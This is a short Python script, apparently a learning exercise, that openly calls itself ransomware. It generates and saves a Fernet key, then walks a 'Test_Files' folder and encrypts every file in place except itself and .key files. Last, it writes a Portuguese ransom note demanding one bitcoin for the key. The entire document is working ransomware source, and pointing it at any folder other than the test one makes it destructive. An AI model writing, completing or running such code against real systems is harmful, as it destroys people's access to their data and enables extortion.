from cryptography.fernet import Fernet #Lib to crypto
import os #Navegate into files and folders

#1. Make an cryptography key and save
def make_ckey():
    key = Fernet.generate_key() 
    with open("key.key", "wb") as key_file:
        key_file.write(key)

#2. Load the save key
def load_ckey():
    return open("key.key", "rb").read()

#3 Cryptograph a unique file
def crypto_file(file, key):
    f = Fernet(key)
    with open(file, "rb") as filed:
        data = filed.read()
    data_crypto = f.encrypt(data)
    with open(file, "wb") as filed:
        filed.write(data_crypto)

#4 Find a folder to cryptograph
def find_files(folder):
    list = []
    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            if name != "ransomware.py" and not name.endswith(".key"):
                list.append(path)
    return list

#5 Rescue Message
def rescue_message():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! \n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante! \n")
        f.write("Depois disso, enviaremos a chave para vocÊ recuperar seus dados")

#6 Main
def main():
    make_ckey()
    key = load_ckey()
    files = find_files("Test_Files")
    for file in files:
        crypto_file(file, key)
    rescue_message()
    print("Ransomware Executado! Arquivos criptografados")

if __name__=="__main__":
    main()
